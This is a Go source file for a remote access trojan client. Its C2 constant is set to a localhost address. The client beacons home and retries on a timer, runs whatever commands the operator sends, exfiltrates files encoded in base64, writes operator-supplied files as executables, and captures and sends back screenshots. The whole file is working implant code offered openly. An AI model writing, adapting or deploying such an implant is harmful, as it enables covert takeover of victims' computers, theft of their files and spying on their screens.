// Author : Nemuel Wainaina

package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const (
	C2 string = "127.0.0.1:12345"
)

func main() {
	conn, _ := connect_home(C2)

	for {
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "q" || cmd == "quit" || cmd == "exit" {
			send_msg(conn, "Connection closing :|")
			conn.Close()
			os.Exit(0)
		} else if cmd[0:2] == "cd" {
			if cmd == "cd" {
				result, err := os.Getwd()
				if err != nil {
					send_msg(conn, err.Error())
				} else {
					send_msg(conn, result)
				}
			} else {
				tgt_dir := strings.Split(cmd, " ")[1]
				if err := os.Chdir(tgt_dir); err != nil {
					send_msg(conn, err.Error())
				} else {
					cur_wd, _ := os.Getwd()
					send_msg(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
				}
			}
		} else if strings.Split(cmd, " ")[0] == "download" {
			if cmd == "download" {
				send_msg(conn, "Supply a file to download :|")
			} else {
				tgt_file := strings.Split(cmd, " ")[1]
				send_msg(conn, read_file(tgt_file))
			}
		} else if strings.Split(cmd, ":")[0] == "file"  { 
			b64_content := strings.Split(cmd, ":")[1]
			file_name := strings.Split(cmd, ":")[2]
			result := save_file(file_name, b64_content)
			send_msg(conn, result)
		} else if cmd == "capturescr" {
			result := capture_scr()
			send_msg(conn, result)
		} else {
			send_msg(conn, exec_cmd(cmd))
		}
	}
}

func connect_home(C2 string)  (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		return connect_home(C2)
	}
	return conn, nil
}

func send_msg(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s\n", msg)
}

func exec_cmd(cmd string) string {
	result, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	}
	return string(result)
}

func file_b64(file string) string {
	content, _ := os.ReadFile(file)
	return b64.StdEncoding.EncodeToString(content)
}

func file_exists(file string) bool {
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

func read_file(file string) string {
	if file_exists(file) {
		return "file:" + file_b64(file)
	}
	return "An error occurred"
}

func save_file(file string, b64_content string) string {
	content, err := b64.StdEncoding.DecodeString(b64_content)
	if err != nil {
		return err.Error()
	}
	os.WriteFile(file, content, 0766)
	return fmt.Sprintf("%s saved successfully", file)
}

func capture_scr() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("scrshot.png")
	defer file.Close()
	png.Encode(file, img)
	scrshot := file_b64("scrshot.png")
	os.Remove("scrshot.png")
	fmt.Println(scrshot)
	return "img:" + scrshot
}